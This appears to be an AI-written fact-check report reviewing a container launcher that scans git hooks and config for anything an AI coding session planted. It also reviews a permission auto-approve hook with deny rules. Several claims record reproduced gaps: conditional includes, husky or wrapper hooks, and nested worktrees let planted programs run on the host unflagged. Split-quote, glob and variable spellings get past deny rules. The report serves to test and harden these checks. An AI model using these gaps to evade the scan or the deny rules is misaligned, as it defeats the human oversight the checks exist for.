Commit: 02d14b0

# Code Fact-Check Report

**Repository:** /workspace (claude-workflows), branch integrate/q076-q080
**Scope:** `git diff main...02d14b0 -- . ':!skills'` (pass-1 diff), plus commit messages d9a895d, a958372, df11830 and 376a8a2. Iteration 2, replicate r1.
**Checked:** 2026-09-27
**Total claims checked:** 30
**Summary:** 18 verified, 6 mostly accurate, 0 stale, 4 incorrect, 2 unverifiable

Execution logs are in `$SP/iter2-r1/`, where `$SP` = `/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad`. All runs used a scratch clone at 02d14b0 (`$SP/iter2-r1/x`) or, for before/after checks, `$SP/iter2-r1/old`. Host tool: git 2.39.5, GNU find/bash, run inside this cc-isolated container.

Suite runs (cwd `$SP/iter2-r1/x`, started 2026-09-27T15:43:18-07:00, all exit 0): cc-isolated-functions 125/125, auto-approve-allowed-commands 21/21, link-claude-home-wiring 16/16, generate-reports 49/49, skills/eval-helpers-freshness 32/32, install-host 92/92. Logs: `$SP/iter2-r1/bats-*.log`, `$SP/iter2-r1/bats-ts.txt`.

---

## Claims Requiring Attention

### Incorrect
- **Claim 3** (`devcontainer-config/cc-isolated.sh:542-545`, and guide step 7): the scan does not see every file host git reads to decide what to run. Reproduced: a relative `core.hooksPath` set via a host global `includeIf "gitdir:…"` (P1), and a nested worktree whose common dir is a bare repo in the checkout that is not named `.git` (P6). In both, the scan returned 0 and host git then ran the planted program.
- **Claim 4** (`devcontainer-config/cc-isolated.sh:559-561`; `guides/cc-isolated-usage.md:181`): "the hooks dir and attributes file your own global/system config names" is false when the global config names them through a conditional include. `_snap_host_config` reads the config from `/`, so no `includeIf gitdir:/onbranch:/hasconfig:` block applies (P1).
- **Claim 8** (`devcontainer-config/cc-isolated.sh:583-589`): the LIMITS paragraph leaves out the largest practical gap. A hook present at launch that runs a file from the checkout (pre-commit framework, husky v9, a `tools/check.sh` wrapper) lets the session change what runs without a finding (P2, P3). It also leaves out P1 and P6.
- **Claim 19** (`guides/cc-isolated-usage.md:194-209`): the guide's "Its limits" list has the same omissions as Claim 8. Its "Hooks … are the exception: their contents are hashed" is literally true, but a husky or pre-commit user reading it would wrongly conclude hook-driven execution is covered.

### Stale
- None.

### Mostly Accurate
- **Claim 1** (`.gitignore:4`): "Generated eval reports are committed". The negations work, but no report is tracked (0 files). 376a8a2 corrected this same wording in two other files but not here.
- **Claim 6** (`devcontainer-config/cc-isolated.sh:571-578`): "Everything else is find, stat, readlink and sha256sum" leaves out other processes the scan starts. These include a second `git config --file … --no-includes --get core.worktree`, a host `git config --null --list` that follows includes and has no `--file`, and realpath, mktemp, sort and awk. The property that matters holds: nothing from the checkout runs.
- **Claim 7** (`devcontainer-config/cc-isolated.sh:580-581, 914-918`; `guides/cc-isolated-usage.md:192-193`): scan_vis keeps newlines. A container-chosen hook name with an embedded newline can forge extra lines in the exit-4 or launch-refusal message (P4).
- **Claim 10** (`devcontainer-config/cc-isolated.sh:920-922`): "under a changed config file, its added and removed entries". When the only change is a newline or tab in a value, it collapses to `?` and matches the old entry, so the file shows as `~ changed` with no entry lines (P9). The file itself is still reported.
- **Claim 26** (`scripts/run-tests.sh:100-101`): "(reports are tracked; Q-071 [1])". No report is tracked. They are *trackable*, as 376a8a2 now says elsewhere.
- **Claim 28** (commit `d9a895d`): "Against the previous scan 14 of the 15 new (a)-(f) cases fail". There are 16 (a)-(f) cases, and 15 of them fail against 37cae85's scan. Only "(f) unreadable ESC-named hook at exit" passes.

### Unverifiable
- **Claim 12** (`devcontainer-config/cc-isolated.sh:1143-1146`): "claude still gets its own Ctrl-C" needs a live `devcontainer exec`. That the launcher survives SIGINT and scans was executed with a stub (r3-int X9: exit 3).
- **Claim 22** (`hooks/auto-approve-allowed-commands.sh:44-45`; `docs/decisions/log.md:76`): whether a hook decision overrides `permissions.deny` (#39344) needs the issue tracker or a live Claude Code. The sandbox has no egress.

---

## Claim 1: "Generated eval reports are committed (Q-071 [1]): the report and every sidecar the suites read to grade it … Anything else a run might leave in output/ stays ignored."

**Location:** `.gitignore:4-12`
**Type:** Configuration
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers which flat `output/` files are ignored. It does not establish that any report is committed: none is.
**Legibility-target:** for-author

`git check-ignore -v --no-index` shows `.report.md`, `.stamp`, `.failed` and `.transcript.jsonl` re-included by lines 9-12, and `scratch.tmp` ignored by line 8 (`test/skills/*/output/*`). `git ls-files 'test/skills/*/output/*'` returns 0 files. The comment's "are committed" (`.gitignore:4`) states policy as fact. Commit 376a8a2 ("No report is tracked yet; the wording claimed they were") fixed that same wording in `guides/skill-creation.md` and `generate-reports.bash`, but not here.

**Evidence:** `.gitignore:4-12`; `$SP/iter2-r1/gitignore.log` (cmd: `git check-ignore -v --no-index <paths>; git ls-files …`, cwd `$SP/iter2-r1/x`, 2026-09-27T15:48:44-07:00, exit 0)

---

## Claim 2: iteration-1 Incorrect reproductions (X3 submodule fsmonitor, X4 receivepack, X6 unlistable hooks dir, X7 repointed pushurl; r3 X4/X5/X6) now yield a finding or fail closed

**Location:** `devcontainer-config/cc-isolated.sh:594-912` (resolves iter1 Claims 2, 5, 9, 18, 21, 23, 24, 64)
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the iteration-1 plants: submodule `.git/modules/*/config` and hooks, `remote.*.receivepack`/`uploadpack`, a pushurl to an in-checkout bare repo, a 0111/0311 hooks dir, `core.attributesFile`/difftool/mergetool/packObjectsHook, a relative global hooksPath, and control bytes at launch. It does not establish completeness (see Claims 3, 4 and 8).
**Legibility-target:** for-orchestrator-synthesis

Re-running iteration-1 r3's `r3-probe.bats` against 02d14b0 gave these results. X4 (submodule fsmonitor/hook), X5 (global relative hooksPath) and X6 (attributesFile etc.) are written to assert the *gap*, so each now fails with `status=1`: the scan reports a finding. X2 still gives 4, X3 still gives 3, and X8 (FIFO hook) does not hang. The new bats cases (a)-(f) pin the iter1 plants. Examples are `exit scan (a): remote.origin.receivepack is named`, `(b): a pushurl repointed at a bare repo`, `(c): a submodule git dir's config, hooks and attributes`, and `(d): a hooks dir made traversable but not listable fails closed (status 2)`. All 125 cases pass. The iter1 `logs/extra*.log` probe files are no longer in the scratchpad, so they could not be re-run as files. They are covered by the pinned tests.

**Evidence:** `devcontainer-config/cc-isolated.sh:706-720`, `:759-790`, `:817-851`; `test/cc-isolated-functions.bats` (cases (a)-(f)); `$SP/iter2-r1/r3-probe-rerun.log` (cmd `bats $SP/r3-probe.bats`, cwd `$SP`, 2026-09-27T15:47, exit 1 = gap tests now failing as expected), `$SP/iter2-r1/bats-cc-isolated-functions.log`

---

## Claim 3: "So main() snapshots every file host git reads to decide what to run, before the session, and compares after claude exits; anything added, removed or changed is named, and the launcher exits 3 instead of 0."

**Location:** `devcontainer-config/cc-isolated.sh:542-545` (same claim: `guides/cc-isolated-usage.md:50-57`, `:170-172`)
**Type:** Behavioral / Invariant
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers two reproduced cases where the scan returned 0 and host git then ran a planted program: P1, a host conditional include, and P6, a nested worktree whose common dir is an in-checkout bare repo. The two cases where host git runs a file it does not itself "read" (P2/P3) are verdicted under Claim 8. It does not enumerate every gap.
**Legibility-target:** for-author

- **P1.** The host global config has `[includeIf "gitdir:<ws>/"] path = work.gitconfig`, and that file sets `core.hooksPath = .githooks`. In the repo, host git sees `hooksPath=.githooks`. The baseline is taken, then `.githooks/pre-commit` is planted. Result: `[P1] scan rc=0 ; markers after host git op: [P1-precommit ]`. The cause is `_snap_host_config` (`:796-812`), which reads `(cd / && git --no-pager config --null --list)`. From `/` there is no git dir, so the `gitdir:` condition never matches.
- **P6.** A baseline bare repo `vendor/lib.bare` sits in the checkout, with a linked worktree at `nested/` (`.git` = `gitdir: …/vendor/lib.bare/worktrees/nested`). The session plants `core.fsmonitor` in `vendor/lib.bare/config` and a hook in its `hooks/`. Result: `[P6] scan rc=0 ; markers after host git op: [P6-fsmonitor ]` (host `git status` in `nested/`). The cause: `_snap_dotgit` walks only the gitdir named by the `.git` file (`if [ -d "$g" ]; then _snap_gitdir "$g"; fi`, `:864`). `_snap_gitdir` records a `commondir` file (`_snap_file commondir-file "$f"`, `:839`) but never walks its target. `vendor/lib.bare` is not named `.git`, so the working-tree find (`-mindepth 2 -name .git`, `:901`) misses it. P6 needs this structure to exist at launch, and host git has to be run in `nested/`.

**Evidence:** `devcontainer-config/cc-isolated.sh:542-545`, `:796-812`, `:838-839`, `:853-868`, `:899-901`; `$SP/iter2-r1/probes.sh`, `$SP/iter2-r1/probes.log` (cmd `bash $SP/iter2-r1/probes.sh`, cwd `$SP/iter2-r1`, 2026-09-27T15:46:48-07:00, exit 0)

---

## Claim 4: "Also the hooks dir and attributes file your own global/system config names: a relative core.hooksPath there resolves inside the checkout." / guide: "…and the ones your own global config names"

**Location:** `devcontainer-config/cc-isolated.sh:559-561`, `:792-795`; `guides/cc-isolated-usage.md:181`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers global config that sets hooksPath/attributesFile through `includeIf` (reproduced with `gitdir:`; `onbranch:` and `hasconfig:remote.*.url:` also only evaluate inside a repo). Unconditional global settings are covered: test `(e): a relative core.hooksPath in YOUR global config is walked` passes, and r3 X5 now fails as a gap test.
**Legibility-target:** for-author

The reading is `(cd / && git --no-pager config --null --list)` (`cc-isolated.sh:798`). It follows unconditional includes, but a conditional include applies only when git has a repo. P1 shows the resulting miss (see Claim 3). Per-directory `includeIf "gitdir:~/code/"` blocks are a common way to set a hooks dir per org. A user with one is not covered.

**Evidence:** `devcontainer-config/cc-isolated.sh:796-812`; `$SP/iter2-r1/probes.log` (P1)

---

## Claim 5: "FAIL CLOSED. A directory that cannot be listed, a file that cannot be read or a config git cannot parse makes the snapshot fail: at launch the launcher refuses to start, at exit it returns 4."

**Location:** `devcontainer-config/cc-isolated.sh:566-569` (guide `:188-191`, step 7 `:55-57`)
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers an unparseable config in `.git/modules/*`, an unlistable directory anywhere in the working tree, an unlistable hooks dir, an unreadable hook, and a baseline failure refusing launch. It does not establish behaviour for a FIFO-typed `config` or `commondir`: these are recorded as `other` and not parsed (host git would block reading them, not run a program).
**Legibility-target:** for-orchestrator-synthesis

`_snap_find` returns 1 when `find -P` fails (`if ! find -P "$@" -print0 > "$out" 2> "$out.err"; then … return 1`, `:681-684`). `_snap_config` returns 1 when `git config --list` fails (`:766-768`). `git_exit_scan` maps a failed snapshot to `return 2` (`:958`), and `main` maps 2 to `*) exit 4 ;;` (`:1156`). The launch path does `exit 1` after the scan_vis'd error (`:1081-1090`). Results: P7a (a `[core` + garbage config in `.git/modules/s`) gave `rc=2`. P7b (`src/` chmod 0311 in the working tree) gave `rc=2`. P7c (a hook symlinked to a FIFO at baseline) gave `rc=0` with no hang. Tests (d) and (f) pin the launch refusal.

**Evidence:** `devcontainer-config/cc-isolated.sh:679-685`, `:766-769`, `:945-959`, `:1078-1092`, `:1151-1157`; `$SP/iter2-r1/probes2.log` (cmd `bash $SP/iter2-r1/probes2.sh`, 2026-09-27T15:48:35-07:00, exit 0); `$SP/iter2-r1/bats-cc-isolated-functions.log`

---

## Claim 6: "THE SCAN RUNS NOTHING FROM THE REPO. … Config is read with `git config --file <f> --no-includes` from cwd /… Everything else is find, stat, readlink and sha256sum; find never follows symlinks (-P), and a symlink's target is hashed only when it is a regular file. Nothing refreshes an index"

**Location:** `devcontainer-config/cc-isolated.sh:571-578` (guide `:192-196`; commit d9a895d "Still nothing from the checkout runs")
**Type:** Invariant
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every process the snapshot functions start, including symlink/FIFO handling, and establishes that none runs checkout content. It does not establish that the enumeration "everything else is …" is complete (it is not).
**Legibility-target:** for-orchestrator-synthesis

Repo configs are read only as `(cd / && git --no-pager config --file "$f" --no-includes --null --list)` (`:766`). The enumeration is short, though, of what the scan actually starts:
- `_snap_worktree_of` runs `(cd / && git --no-pager config --file "$1" --no-includes --get core.worktree …)` (`:729`).
- `_snap_host_config` runs `(cd / && git --no-pager config --null --list)` (`:798`), which has no `--file` or `--no-includes`, so the *host's* includes are followed.
- Other processes: `realpath -m` (`:701`, `:762`), `mktemp`, `sort`, `awk`, `tr`, `cut`, `rm`.

None of these executes content from the checkout. `_snap_file` hashes through a symlink only when `[ -f "$p" ]` (`:652-654`), and a FIFO target records `other`. In P5 (a FIFO include target and a hook symlinked to a FIFO), the scan returned in time (`rc=1`, not 124). The 125-case suite includes the "named, and not run" assertions, with an empty marker dir.

**Evidence:** `devcontainer-config/cc-isolated.sh:646-675`, `:699-704`, `:724-736`, `:766`, `:796-812`; `$SP/iter2-r1/probes.log` (P5), `$SP/iter2-r1/bats-cc-isolated-functions.log`

---

## Claim 7: "EVERY CONTAINER-CHOSEN STRING (names, values, error text) reaches the terminal only through scan_vis, at launch and at exit." / scan_vis: "make control bytes visible as '?' so a container-chosen hook name or config value cannot rewrite the terminal around the warning." / guide: "Every name, value and error it prints goes through a filter that shows control bytes as `?`."

**Location:** `devcontainer-config/cc-isolated.sh:580-581`, `:914-918`; `guides/cc-isolated-usage.md:192-193`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers all scan output paths: exit warning, exit-4 warning and launch refusal. ESC and other non-newline control bytes become `?` (test (f), both cases). It does not hold for newline.
**Legibility-target:** for-author

`scan_vis` is `LC_ALL=C tr -c '[:print:]\n' '?'` (`:917`), so `\n` passes through. In the diff report, paths are `%q`-quoted and values have `\n` replaced (`t="${val//$'\n'/?}"`, `:774`), so newlines cannot forge lines there. The fail-closed messages carry raw paths, though (`printf 'cannot read %s\n' "$1"`, `:635`). P4 planted an unreadable hook named `x\n  (forged line: nothing else changed)`. The exit-4 warning printed that text as its own indented line (`…/.git/hooks/x$` then `  (forged line: nothing else changed)$`). The exit code is still 4, so the effect is cosmetic spoofing inside a warning that already says the checkout is untrusted.

**Evidence:** `devcontainer-config/cc-isolated.sh:631-639`, `:914-918`, `:945-958`; `$SP/iter2-r1/probes.log` (P4)

---

## Claim 8: "LIMITS … The container keeps running after claude exits … Whatever is present at launch is the baseline … A launcher killed before the scan … scans nothing. A config value that names a program by path inside the checkout … is recorded as a value, not followed"

**Location:** `devcontainer-config/cc-isolated.sh:583-589`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Each listed limit is accurate (P8 confirmed the core.pager case: `rc=0`). What is verdicted is the paragraph's completeness as the list of limits. It omits hook-mediated execution of checkout files and the P1/P6 gaps. It does not claim the scan should cover them.
**Legibility-target:** for-author

- **P2.** A baseline `.git/hooks/pre-commit` runs `exec "$(git rev-parse --show-toplevel)/tools/check.sh"`, and the session rewrites `tools/check.sh`. Result: `[P2] scan rc=0 ; markers after host git op: [P2-tools-check ]`.
- **P3.** A husky v9 layout: `core.hooksPath=.husky/_`, where `_/pre-commit` runs `../pre-commit`. The session rewrites `.husky/pre-commit`. Result: `[P3] scan rc=0 ; markers …: [P3-husky ]`.

The pre-commit framework is the same shape: its hook reads `.pre-commit-config.yaml` from the working tree, where `language: system` entries name arbitrary commands (static inference, not executed here). These setups are common, and the listed "program named by path" limit covers config values only. `_snap_hooks` hashes only direct entries of the hooks dir (`-mindepth 1 -maxdepth 1`, `:716`).

**Evidence:** `devcontainer-config/cc-isolated.sh:583-589`, `:706-720`; `$SP/iter2-r1/probes.log` (P2, P3), `$SP/iter2-r1/probes2.log` (P8)

---

## Claim 9: "SIZE. This block brings cc-isolated.sh to about 1160 lines."

**Location:** `devcontainer-config/cc-isolated.sh:591`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the line count at 02d14b0. It does not establish the PAYLOAD/manifest rationale.
**Legibility-target:** for-orchestrator-synthesis

`wc -l` gives 1163 (paraphrased — no quote available because the claim is about file length, not a snippet).

**Evidence:** `devcontainer-config/cc-isolated.sh:1-1163`

---

## Claim 10: "scan_diff … Files first (+ new, - gone, ~ changed); under a changed config file, its added and removed entries, with keys the label list knows marked "<- can run a program"."

**Location:** `devcontainer-config/cc-isolated.sh:920-922` (guide `:184-186`)
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers report composition. A change can yield a `~ config` line with no entry lines. It does not affect the exit code.
**Legibility-target:** for-author

C records replace `\n` and `\t` in values with `?` (`t="${val//$'\n'/?}"`, `:774`; `${t//$'\t'/?}`, `:775`). A value changed from the literal `a?b` to `a\nb` therefore produces an identical C record. In P9 the report showed only `~ config …/.git/config  file 644 60d2fc3a318dae5a` with no `+`/`-` entry. The finding and exit 1 still stand because the file hash changed.

**Evidence:** `devcontainer-config/cc-isolated.sh:770-776`, `:923-940`; `$SP/iter2-r1/probes2.log` (P9)

---

## Claim 11: "git_exit_scan <ws> <launch snapshot>: 0 when nothing … changed; 1 … when something did; 2 when the exit state could not be read." / main: `0) exit "$rc"`, `1) exit 3`, `*) exit 4`

**Location:** `devcontainer-config/cc-isolated.sh:942-944`, `:1151-1157`; guide step 7 `:50-57`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the exit contract with a stubbed devcontainer CLI. A clean scan passes claude's own status through, which may be nonzero. It does not establish live-container behaviour.
**Legibility-target:** for-orchestrator-synthesis

Results from r3-probe re-run against 02d14b0: X1 (clean, claude exits 7) gave status 7. X2 (`.git` replaced by junk) gave 4. X3 (fsmonitor planted, claude 7) gave 3. X9 (SIGINT to the process group after a plant) gave 3.

**Evidence:** `devcontainer-config/cc-isolated.sh:945-984`, `:1147-1157`; `$SP/iter2-r1/r3-probe-rerun.log`, `$SP/iter2-r1/r3-int-rerun.log` (cmd `bats $SP/r3-int.bats`, 2026-09-27T15:47:16-07:00; X10 ends in a deliberate `false` after printing `status=130`)

---

## Claim 12: "The INT trap keeps a Ctrl-C that ends the session from also killing the launcher before the scan (a trapped signal … is reset to its default in the child, so claude still gets its own Ctrl-C)."

**Location:** `devcontainer-config/cc-isolated.sh:1143-1146` (guide `:201`: "Ctrl-C that ends the session still scans")
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the launcher surviving SIGINT and scanning (stub X9: exit 3). It does not establish that `claude` under a real `devcontainer exec` receives the Ctrl-C, which needs a live container.
**Legibility-target:** for-orchestrator-synthesis

`trap ':' INT` / `devcontainer exec "${dc[@]}" claude || rc=$?` / `trap - INT` (`:1148-1150`). The launcher-survives half ran under `setsid` with the stub. Execution required for the other half is blocked: there is no Docker here.

**Evidence:** `devcontainer-config/cc-isolated.sh:1147-1150`; `$SP/iter2-r1/r3-int-rerun.log`

---

## Claim 13: exit warning: "Safest: push from a separate host clone that fetches from this one; a fetch runs none of this checkout's hooks, fsmonitor, filters or remote settings. `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` covers hooks and fsmonitor ONLY: not remote.*.receivepack, a repointed remote, filters, includes, credential helpers or core.sshCommand."

**Location:** `devcontainer-config/cc-isolated.sh:976-980`; `guides/cc-isolated-usage.md:210-219`; commit d9a895d (resolves iter1 Claims 12, 25)
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers these, on git 2.39.5:
- A separate clone fetching from a checkout with planted hooks, fsmonitor, a filter, sshCommand, packObjectsHook and receivepack: none ran.
- The hooks-only push running receivepack.
- `-c protocol.file.allow=never` refusing a local-path push.

It does not establish other git versions, or a clone that later runs git *in* the checkout.
**Legibility-target:** for-orchestrator-synthesis

`sepclone.sh` reported `fetch rc=0 … markers: []`. Test `(a)` runs `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` and asserts `[ -e "$TEST_TMPDIR/ran/receivepack" ]`. It then runs `git -c protocol.file.allow=never push` and asserts status ≠ 0 with no marker. The test passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:976-980`; `test/cc-isolated-functions.bats` case `(a)`; `$SP/iter2-r1/sepclone.log` (cmd `bash $SP/sepclone.sh`, 2026-09-27T15:45:40-07:00, exit 0)

---

## Claim 14: "Baseline for the exit scan, taken before the container is (re)started. A repo whose .git cannot be read here could not be scanned at exit either, so refuse. The reason can name files an earlier session chose, so it goes through scan_vis." / guide "Before step 4 the launcher snapshots…"

**Location:** `devcontainer-config/cc-isolated.sh:1075-1077`; `guides/cc-isolated-usage.md:50`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the ordering (after check_manifest and before `devcontainer up`) and the refusal. The newline caveat is Claim 7.
**Legibility-target:** for-orchestrator-synthesis

`git_before="$(git_exec_snapshot "$ws" 2>"$snap_err")"` runs inside `if [ "$action" = "launch" ]` (`:1079-1081`), before `devcontainer up "${dc[@]}"` (`:1110`). Its failure is piped through `scan_vis` and ends in `exit 1` (`:1082-1089`). Test `(f): a launch whose baseline fails prints the container-chosen name through '?'` passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:1065-1110`; `$SP/iter2-r1/bats-cc-isolated-functions.log`

---

## Claim 15: Decision-log row 53 amendment: "The image has no bwrap or socat and the container refuses unprivileged user namespaces (`unshare -Ur` → EPERM)… each of those three spellings is pinned by a test. In a deny rule only `*` is a wildcard, and a bare `Bash` deny rule blocks all approval."

**Location:** `docs/decisions/log.md:76`
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the sandbox facts in this cc-isolated container (`/etc/cc-config-hash` = `63fa8fc01e97ca3e`), the three pinned spellings, and the deny-rule syntax. The #39344 part is Claim 22. It does not establish Claude Code's own deny matching (see Claim 23).
**Legibility-target:** for-orchestrator-synthesis

The sandbox log shows `no bwrap`, `no socat`, `unshare: unshare failed: Operation not permitted`. The tests `string-match limit: a spelling without the literal name…`, `…a glob spelling…` and `…a variable set by an earlier command…` exist and pass. hookprobe results: `deny=["Bash"]` → no output, `Bash(*)` → no output, `Bash(ls [x])` vs `ls [x]` → no output, and `Bash(ls ?)` vs `ls a` → `allow` (so `?` is literal). This resolves iter1 Claims 28, 30, 32 and 36.

**Evidence:** `docs/decisions/log.md:76`; `test/auto-approve-allowed-commands.bats:179-243`; `$SP/iter2-r1/sandbox.log` (2026-09-27T15:48:52-07:00), `$SP/iter2-r1/hookprobe-rerun.log` (cmd `bash $SP/hookprobe.sh`, cwd `$SP`, 2026-09-27T22:47:19Z, exit 0)

---

## Claim 16: "It never approves a command that matches a `Bash(...)` deny rule … misses obfuscated spellings: quotes split inside the name, a glob, or a variable whose value is not spelled out in the same command. In a deny rule only `*` is a wildcard, and a bare `Bash` rule denies every command."

**Location:** `guides/bare-host-hook-wiring.md:151-156`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's own decision. "Denies" means the hook never returns allow. It does not establish that Claude Code blocks the command.
**Legibility-target:** for-orchestrator-synthesis

`if matches_deny "$command" deny_globs; then … exit 0` (`hooks/auto-approve-allowed-commands.sh:264-267`) checks the raw string before anything can reach the empty-extraction `allow` branch at `:302-305`. It checks each extracted command again at `:313-316`. The suite (21/21) and hookprobe cover each listed case. This resolves iter1 Claims 27, 38 and 47.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:113-167`, `:260-331`; `$SP/iter2-r1/bats-auto-approve-allowed-commands.log`, `$SP/iter2-r1/hookprobe-rerun.log`

---

## Claim 17: step 7 / coverage paragraph: covers "every `config`, `config.worktree` and `commondir` file, `info/attributes`, every hooks dir and hook (except `*.sample`) and every symlink in the git dir and common dir, recursively through `.git/modules/**` and `.git/worktrees/*` … and any local-path remote inside the checkout, walked as a git dir"

**Location:** `guides/cc-isolated-usage.md:174-183`; `devcontainer-config/cc-isolated.sh:551-559`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the enumerated in-`.git` set and in-checkout local remotes (url/pushurl), per `_snap_gitdir`'s unpruned find. It does not cover the "global config names" clause (Claim 4), a nested worktree's non-`.git` common dir (Claim 3, P6), or `branch.*.pushRemote`/`insteadOf` paths present at launch (recorded only as values).
**Legibility-target:** for-orchestrator-synthesis

`_snap_find "$list" "$real" \( -type l -o -name config -o -name config.worktree -o -name commondir -o -path '*/info/attributes' -o -name hooks -o -path '*/hooks/*' \) ! -name '*.sample'` (`:823-825`) runs over the whole git dir and common dir. `_snap_remote` walks a local-path url/pushurl only when `_snap_inside_ws` (`:741-757`). Tests (b), (c) and (d) pass.

**Evidence:** `devcontainer-config/cc-isolated.sh:741-757`, `:817-851`, `:874-912`; `$SP/iter2-r1/bats-cc-isolated-functions.log`

---

## Claim 18: "every embedded repo's `.git` in the working tree (host `git status` recurses into it)"

**Location:** `guides/cc-isolated-usage.md:179-180`; `devcontainer-config/cc-isolated.sh:555-556`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers every entry named `.git` below the top, and the git dir that entry resolves to. It does not cover the *common* dir of a nested linked worktree (P6, Claim 3). Host `git status` recurses only into registered gitlinks, not every embedded repo; the parenthetical was not re-tested here.
**Legibility-target:** for-orchestrator-synthesis

`_snap_find "$list" "$_snap_ws" -mindepth 2 -name .git` then `_snap_dotgit "$f"` (`:901-907`). Test `(c): an embedded repo's .git in the working tree is scanned` passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:853-868`, `:899-907`; `$SP/iter2-r1/bats-cc-isolated-functions.log`

---

## Claim 19: "Its limits: Baseline, not audit … After the scan … No scan … Outside `.git` … Programs named by path … Hooks, hooks dirs, includes and attribute files are the exception: their contents are hashed."

**Location:** `guides/cc-isolated-usage.md:193-209`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Each stated limit is accurate. What is verdicted is the list's completeness and the "exception" sentence as a reader would act on it. It omits baseline hooks that run checkout files (P2/P3), conditional host includes (P1), and nested-worktree common dirs (P6).
**Legibility-target:** for-author

See Claims 3, 4 and 8 for the reproductions. "Hooks … are the exception: their contents are hashed" is true of the hook file. But the husky v9 hook (P3) and a wrapper hook (P2) delegate to checkout files that are not hashed, and both ran after `scan rc=0`.

**Evidence:** `guides/cc-isolated-usage.md:193-209`; `$SP/iter2-r1/probes.log`

---

## Claim 20: "Report generation — … writes … with a provenance `.stamp` (hashes of the skill directory, its `runner.bash` and the fixture, not the shared harness); reports and their sidecars are meant to be committed once generated (none are yet; `.gitignore` admits them), and a report whose stamp no longer matches fails its suite until regenerated."

**Location:** `guides/skill-creation.md:63`
**Type:** Behavioral / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers stamp inputs, the ignore rules, the untracked state, and the stale-stamp failure. It does not establish that every format suite calls `check_report_stamp`.
**Legibility-target:** for-orchestrator-synthesis

`report_stamp` prints only `skill`, `runner` and `fixture` lines (`test/skills/runner-contract.bash:199-204`). eval-helpers-freshness (32/32) includes `stamp: editing the shared runner-contract.bash does not stale a report` and `an old-format stamp … reads as stale` (`changed since generation: stamp format.`). This resolves iter1 Claim 33.

**Evidence:** `test/skills/runner-contract.bash:181-218`; `test/skills/eval-helpers-freshness.bats:93-107`; `$SP/iter2-r1/bats-eval-helpers-freshness.log`, `$SP/iter2-r1/gitignore.log`

---

## Claim 21: "F4 … runs 364–438 characters (was 951–2969) … The displaced long-tail trigger phrases and caveats moved into a `## When to use` section in each SKILL.md body (appended to the existing section in design-space-situating, pre-mortem and what-if-analysis)."

**Location:** `guides/skill-format-audit.md:20`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the 25 description lengths before and after (folded YAML joined by single spaces), and the presence of the section. It does not establish the "within ~250 characters in all but a few cases" placement claim, which is too vague to check exactly. Trigger lists start at char 152-300.
**Legibility-target:** for-orchestrator-synthesis

The length computation over `skills/*/SKILL.md` gave `25 … (364, self-eval) (438, yglesias-critique)` at HEAD and `951 2969` on `main`. pre-mortem and what-if-analysis have `## When to Use This Skill (vs. …)`, which is the "existing section".

**Evidence:** `guides/skill-format-audit.md:20`; `skills/pre-mortem/SKILL.md:32`, `skills/what-if-analysis/SKILL.md:33` (python length check run inline from `/workspace`, 2026-09-27 ~15:44, exit 0; output reproduced in this claim)

---

## Claim 22: "a hook "ask" overrides permissions.deny (Claude Code issue #39344)" / "(#39344, shown for `ask`; not verified for `allow`)"

**Location:** `hooks/auto-approve-allowed-commands.sh:44-45`; `docs/decisions/log.md:76`; `hooks/wiring.json:33-35`
**Type:** Reference
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers nothing about Claude Code's runtime. It needs the issue tracker or a live Claude Code test. The sandbox has no egress.
**Legibility-target:** for-orchestrator-synthesis

The claim is about external software behaviour (paraphrased — no quote available because the subject is Claude Code's runtime, not code in this repo).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:44-45`

---

## Claim 23: "Rule syntax: only `*` (and the legacy trailing `:*`) is a wildcard, and a bare `Bash` deny rule denies everything. KNOWN DIVERGENCE: … Here it does not (`rm *` needs the space). … `Bash(rm:*)` … matches `rm` alone but, as a plain prefix, also `rmdir`."

**Location:** `hooks/auto-approve-allowed-commands.sh:56-61`, `:113-122`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's matcher. It does not establish Claude Code's matcher (the header itself says that is undocumented).
